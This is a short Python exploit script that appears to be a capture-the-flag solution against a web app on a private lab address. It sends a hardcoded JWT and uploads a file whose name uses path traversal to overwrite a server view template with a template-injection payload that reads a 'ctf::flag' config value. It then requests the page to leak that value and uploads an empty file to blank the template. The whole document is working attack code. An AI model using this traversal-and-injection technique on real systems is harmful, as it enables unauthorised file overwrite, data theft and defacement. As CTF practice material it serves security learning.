import requests
import jwt

JWT= "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDMyNzQ1NTAsImlhdC......."
def exp(ip):
    fake_login(ip)
    upload_file(ip)
    print(requests.get(ip + "/api/menu/index",headers={"Authorization":JWT}).text)
    print(requests.post(ip + "/api/upload/image",files={
        "file":("./../../../../../../../../app/views/menucontroller/index.tpl",'',"image/gif")
    },headers={"Authorization":JWT}).text)
def fake_login(ip):
    print(requests.post(ip + "/api/user/login",json={
        "user_name":"1",
        "password":"123456"
    }).text)

def upload_file(ip):
    print(requests.post(ip + "/api/upload/image",files={
        "file":("./../../../../../../../../app/views/menucontroller/index.tpl",'{{config "String" "ctf::flag" ""}}',"image/gif")
    },headers={"Authorization":JWT}).text)

if __name__ == '__main__':
    exp("http://10.104.255.223/")
